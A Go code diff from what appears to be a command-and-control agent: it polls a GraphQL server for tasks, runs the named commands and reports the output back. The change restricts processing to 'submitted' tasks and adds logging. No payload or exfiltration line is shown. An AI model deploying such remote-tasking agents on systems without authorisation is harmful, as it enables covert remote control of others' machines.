@@ -381,7 +381,6 @@ func sendTaskResponse(taskID string, output string) error {
         query := `
         mutation updateTask($task_id: Int!, $output: String!) {
                 update_task_by_pk(pk_columns: {id: $task_id}, _set: {
-                        status: "completed",
                         completed: true,
                         timestamp: "` + time.Now().Format(time.RFC3339) + `"
                 }) {
@@ -459,9 +458,17 @@ func checkForTasks() error {
         }
         
         if data, ok := resp.Data["task"].([]interface{}); ok && len(data) > 0 {
+                logEvent(fmt.Sprintf("Found %d task(s)", len(data)))
                 for _, taskData := range data {
                         if taskMap, ok := taskData.(map[string]interface{}); ok {
                                 taskID := fmt.Sprintf("%v", taskMap["id"])
+                                taskStatus := fmt.Sprintf("%v", taskMap["status"])
+                                
+                                // Only process submitted tasks
+                                if taskStatus != "submitted" {
+                                        logEvent(fmt.Sprintf("Skipping task %s with status: %s", taskID, taskStatus))
+                                        continue
+                                }
                                 
                                 // Get command name from command object
                                 commandName := ""
@@ -480,12 +487,13 @@ func checkForTasks() error {
                                 logEvent(fmt.Sprintf("Processing task %s: %s with params: %s", taskID, commandName, params))
                                 
                                 output := executeCommand(commandName, params)
+                                logEvent(fmt.Sprintf("Command output length: %d bytes", len(output)))
                                 
                                 err := sendTaskResponse(taskID, output)
                                 if err != nil {
                                         logEvent(fmt.Sprintf("Error sending response: %v", err))
                                 } else {
-                                        logEvent("Task completed successfully")
+                                        logEvent("Task response sent successfully")
                                 }
                         }
                 }
